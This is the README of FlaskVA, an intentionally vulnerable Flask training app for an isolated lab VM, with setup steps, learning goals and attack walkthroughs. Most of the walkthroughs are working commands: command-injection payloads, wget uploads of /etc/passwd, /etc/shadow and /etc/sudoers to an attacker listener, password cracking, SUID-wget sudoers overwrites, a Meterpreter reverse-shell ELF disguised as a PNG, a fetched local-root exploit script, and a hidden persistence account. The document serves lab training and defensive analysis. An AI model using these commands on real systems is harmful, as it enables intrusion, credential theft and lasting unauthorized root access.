# FlaskVA

Please note this is the first version of FlaskVA. I will continue updating it when time allows.

## Authorized lab use only

FlaskVA is an intentionally vulnerable training application. Use it only in the Hullu VM or in an isolated lab environment that you own or have explicit permission to test. Do not expose the VM or this app to the internet.

## Screenshot

![FlaskVA home page showing the vulnerable app modules](image.png)

# FlaskVA in the Hullu VM

FlaskVA is included in the Hullu vulnerable Alpine Linux OVA. You can download it from [SourceForge](https://sourceforge.net/projects/hullu/files).

Hullu documentation, VM details, and lab credentials: https://github.com/kaledaljebur/Hullu

For Hullu setup, lab topology, VM import steps, networking, prerequisites, and credentials, use the Hullu repository. This README focuses on FlaskVA usage and the web-application scenarios inside the Hullu lab.

# How to run FlaskVA manually

```sh
git clone https://github.com/kaledaljebur/FlaskVA
cd FlaskVA
python3 -m venv env
```

On Windows:

```sh
.\env\Scripts\Activate.ps1
```

On Linux:

```sh
source env/bin/activate
```

Then:

```sh
pip install -r requirements.txt
python app.py
```

Open FlaskVA at `http://127.0.0.1:5000/` when running it locally. If you are using the Hullu OVA, use the VM details and credentials from the Hullu repository.

# Learning Objectives

FlaskVA is designed to support both offensive understanding and defensive analysis. The attack steps in this README are included so learners can generate realistic activity inside their own Hullu lab, then investigate that activity from a blue-team point of view.

- Understand how common web vulnerabilities appear in a small Flask application.
- Generate command injection, insecure upload, SUID abuse, local privilege escalation, and persistence events in a controlled VM.
- Practice mapping web activity to Linux process execution, file changes, privilege changes, and network connections.
- Prepare evidence for defensive workflows using tools such as Suricata and Wazuh.
- Learn what indicators should be monitored, alerted on, and cleaned up after a lab exercise.

# Known Lab Assumptions

- IP addresses such as `192.168.8.10` are examples. Replace them with your Kali attacker VM IP.
- `<Hullu-IP>` means the IP address assigned to your Hullu VM.
- The scenarios assume an isolated lab network and should not be run against systems outside your own lab.
- Some scenarios depend on Hullu-specific misconfigurations, such as SUID `wget`, and may not work on a normal Linux system.
- Commands shown in the FlaskVA command injection page are typed into the vulnerable web form, not directly into a local shell, unless the step says "On Kali" or "SSH to Hullu".

# Version Notes

- The scenarios below were tested in Kali against Hullu3.
- Hullu and FlaskVA may change over time, so confirm VM-specific details, credentials, and networking notes in the Hullu repository.
- If a scenario does not behave as expected, verify the Hullu version and whether the required lab misconfiguration is present before changing the steps.

# Cleanup After Lab Practice

After completing a scenario, SSH to the Hullu VM as `root` using the credentials documented in the Hullu repository, then remove the lab artifacts you created. This keeps the VM ready for blue-team review, re-practice, or snapshot cleanup.

Example cleanup checks:

```sh
rm -f /etc/sudoers.d/flaskva
sed -i '/flaskva ALL=(ALL) NOPASSWD: ALL/d' /etc/sudoers
sed -i '/%wheel ALL=(ALL) ALL/d' /etc/sudoers
deluser james 2>/dev/null
rm -f /home/flaskva/FlaskVA/static/uploads/shell.png
rm -f /home/flaskva/FlaskVA/static/uploads/shell.elf
```

If you are using VM snapshots, the cleanest reset is to revert to a known-good Hullu snapshot after collecting the logs and evidence needed for analysis.

# Sample Scenarios (tested in Kali)

The following scenarios are for authorized Hullu lab practice only. Run them from an isolated attacker VM, such as Kali, against your own Hullu VM.

## Privilege escalation via SUID wget (working in Hullu3)

Assumption: FlaskVA runs via `flaskva` account, command injection works, and `wget` has SUID enabled.

### About the SUID `wget` misconfiguration

In this lab, `/usr/bin/wget` may be intentionally misconfigured with the SUID bit. That means `wget` runs with the file owner's privileges, usually `root`, instead of only the privileges of the current user. You can identify the misconfiguration when the permissions include `s`, for example:

```sh
-rwsr-xr-x 1 root root ... /usr/bin/wget
```

On a normal hardened system, `wget` should not be SUID. In Hullu, this misconfiguration is included for isolated privilege-escalation practice, such as writing a lab sudoers drop-in file or reading protected files after you already have command execution.

### 1. Crack the passwords
- Confirm command execution in `http://<Hullu-IP>:5000/command`:

    ```sh
    127.0.0.1; whoami
    127.0.0.1; id
    127.0.0.1; pwd
    127.0.0.1; ls
    127.0.0.1; find / -perm -4000 -type f 2>/dev/null
    127.0.0.1; ls -l /usr/bin/wget
    ```

- Send `/etc/passwd` to Kali Desktop.

    On Kali:

    ```sh
    nc -lvnp 8000 > ~/Desktop/passwd
    ```

    In FlaskVA command injection:

    ```sh
    127.0.0.1; wget --post-file=/etc/passwd http://192.168.8.10:8000/ -O /dev/null
    ```

- Send `/etc/shadow` to Kali Desktop.

    On Kali:

    ```sh
    nc -lvnp 8000 > ~/Desktop/shadow
    ```

    In FlaskVA command injection:

    ```sh
    127.0.0.1; wget --post-file=/etc/shadow http://192.168.8.10:8000/ -O /dev/null
    ```

- Crack captured hashes

    ```sh
    cd ~/Desktop
    unshadow passwd shadow > hashes.txt
    john hashes.txt
    ```

### 2. Privilege escalation

#### Method A: Add sudoers drop-in file to `/etc/sudoers.d/`
- Prepare sudoers payload on Kali:

    ```sh
    echo 'flaskva ALL=(ALL) NOPASSWD: ALL' > flaskva
    python3 -m http.server 8000
    ```

- Write it with SUID `wget`:

    ```sh
    127.0.0.1; wget http://192.168.8.10:8000/flaskva -O /etc/sudoers.d/flaskva; chmod 440 /etc/sudoers.d/flaskva
    ```

- Test root access:

    ```sh
    127.0.0.1; sudo -n id
    ```

    To re-practice it, remove the `flaskva` sudoers file

    ```sh
    127.0.0.1; sudo rm /etc/sudoers.d/flaskva
    ```

#### Method B: Update `/etc/sudoers` file
- Send the current `/etc/sudoers` file to Kali Desktop.

    On Kali:

    ```sh
    nc -lvnp 8000 > ~/Desktop/sudoers
    ```

    In FlaskVA command injection:

    ```sh
    127.0.0.1; wget --post-file=/etc/sudoers http://192.168.8.10:8000/ -O /dev/null
    ```

- On Kali, open `~/Desktop/sudoers`, remove any HTTP headers at the top if they exist, then add this line near the end:

    ```sh
    flaskva ALL=(ALL) NOPASSWD: ALL
    ```

- Host the modified sudoers file from Kali:

    ```sh
    cd ~/Desktop
    python3 -m http.server 8000
    ```

- Overwrite `/etc/sudoers` with SUID `wget`:

    ```sh
    127.0.0.1; wget http://192.168.8.10:8000/sudoers -O /etc/sudoers; chmod 440 /etc/sudoers
    ```

- Test root access:

    ```sh
    127.0.0.1; sudo -n id
    ```

- To re-practice it, remove the added line:

    ```sh
    127.0.0.1; sudo sed -i '/flaskva/d' /etc/sudoers
    ```

## Meterpreter session via disguised ELF upload (working in Hullu3)

Assumption: FlaskVA upload and command injection are available.

- Upload a normal PNG/photo first from `http://<Hullu-IP>:5000/upload`. The page shows a preview; open the preview image in a new tab to see the upload path, such as `static/uploads/<filename>`.

- Create the ELF payload on Kali, then rename it to an allowed upload extension:

    ```sh
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.8.10 LPORT=5555 -f elf -o shell.elf
    mv shell.elf shell.png
    ```

- Start the Metasploit handler on Kali:

    ```sh
    msfconsole
    use exploit/multi/handler
    set payload linux/x64/meterpreter/reverse_tcp
    set LHOST 192.168.8.10
    set LPORT 5555
    run
    ```

- Upload `shell.png` from `http://<Hullu-IP>:5000/upload`.

- Rename it back and make it executable from `http://<Hullu-IP>:5000/command`:

    ```sh
    127.0.0.1; mv static/uploads/shell.png static/uploads/shell.elf
    127.0.0.1; ls -l static/uploads/shell.elf
    127.0.0.1; chmod +x static/uploads/shell.elf
    127.0.0.1; ls -l static/uploads/shell.elf
    ```

- Run the ELF from the command page:

    ```sh
    127.0.0.1; static/uploads/shell.elf
    ```

- Check the session in Meterpreter:

    ```sh
    getuid
    sysinfo
    shell
    ```

- Check if the Wget misconfiguration is available:
  ```sh
  ls -l /usr/bin/wget
  ```    

  - If the Wget misconfiguration exists:
    - In a new Kali terminal, create the sudoers drop-in file and start a web server:

        ```sh
        echo 'flaskva ALL=(ALL) NOPASSWD: ALL' > flaskva
        python3 -m http.server 8000
        ```
    - In the Meterpreter session, download the lab sudoers drop-in file from Kali and test `sudo`:
        ```sh
        sudo -n id
        wget http://192.168.8.10:8000/flaskva -O /etc/sudoers.d/flaskva
        sudo -n id
        ```
    - If the Wget misconfiguration is not available, move to `CVE-2026-31431 CopyFail Vulnerability`.
  
## CVE-2026-31431 CopyFail Vulnerability

- CopyFail is a Linux local privilege escalation vulnerability. Use this only after you already have authorized code execution in your own Hullu lab VM.

- References:
  - NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-31431
  - Microsoft Security Blog: https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/
  - CopyFail project page: https://copy.fail/

- Lab prerequisites:
  - Python 3.10 or newer
  - A vulnerable Linux kernel
  - AF_ALG support enabled
  - A readable SUID binary target, such as `/usr/bin/su`

- Apply the CopyFail vulnerability in the lab:
  ```sh
  cd /tmp
  wget https://raw.githubusercontent.com/kaledaljebur/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py
  python3 /tmp/copy_fail_exp.py
  id
  ```

## Lab-only persistence account practice

- In any of the above lab sessions, you can practice creating a root-level persistence account inside the disposable Hullu VM:
  ```sh
  { echo -e "aaa\naaa" | sudo adduser -G wheel james && sudo echo '%wheel ALL=(ALL) ALL' >> /etc/sudoers; } >/dev/null 2>&1
  ```

  For example, in the command injection page in `FlaskVA`, the command can be:

  ```sh
  127.0.0.1; { echo -e "aaa\naaa" | sudo adduser -G wheel james && sudo echo '%wheel ALL=(ALL) ALL' >> /etc/sudoers; } >/dev/null 2>&1
  ``` 

- Or use this, which avoids adding a duplicate line to `/etc/sudoers`:
  ```sh
  { echo -e "aaa\naaa" | sudo adduser -G wheel james && (sudo grep -qxF '%wheel ALL=(ALL) ALL' /etc/sudoers || echo '%wheel ALL=(ALL) ALL' | sudo tee -a /etc/sudoers); } >/dev/null 2>&1
  ```
